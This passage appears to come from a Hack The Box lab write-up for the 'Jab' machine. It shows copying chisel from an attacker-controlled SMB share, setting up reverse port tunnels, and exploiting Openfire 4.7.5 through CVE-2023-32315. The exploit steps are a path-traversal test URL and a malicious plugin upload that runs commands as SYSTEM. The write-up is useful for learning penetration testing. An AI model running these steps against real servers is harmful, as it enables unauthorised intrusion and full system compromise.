![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-31.png)

Now on the target machine, we can download chisel executable:

`copy \\10.10.14.29\share\chisel_windows.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-33.png)

Let's prepare Chisel server on our Kali machine and start Chisel client sessions from the target machine, tunneling both port **9090** and **9091**:

`.\chisel_windows.exe client 10.10.14.29:9999 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091`

We can see that tunneling session is made on Chisel server side:

`chisel server -p 9999 --reverse`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-32.png)

We should be able to access the website from our local browser now.

### CVE-2023-32315

Let's access the website by going to `http://127.0.0.1:9090` on web browser:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-34.png)

The website is running **Openfire 4.7.5** and we can login using the credentials for **svc_openfire**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-35.png)

Searching for the known exploit regarding the version, it seems like it is vulnerable to **CVE-2023-32315**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-36.png)

By visiting the address below, we can test if the corresponding Webapp is actually vulnerable:

`http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-37.png)

Following [this tutorial](https://github.com/miko550/CVE-2023-32315), we should be able to get a shell as the system. 

Let's first move to **Plugins** tab:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-40.png)

At the bottom of the page, we can see that we can upload our own plugins.

Let's upload **Management Tool** plugin:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-41.png)

After successfully uploading, by going to **Server** >** server settings** > **Management tool**, we get execute commands as the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-42.png)


## References
- https://xmpp.org/software/?platform=linux
- https://igniterealtime.org/projects/spark/
- https://maggick.fr/2020/03/htb-forest.html
- https://learningsomecti.medium.com/path-traversal-to-rce-openfire-cve-2023-32315-6a8bf0285fcc
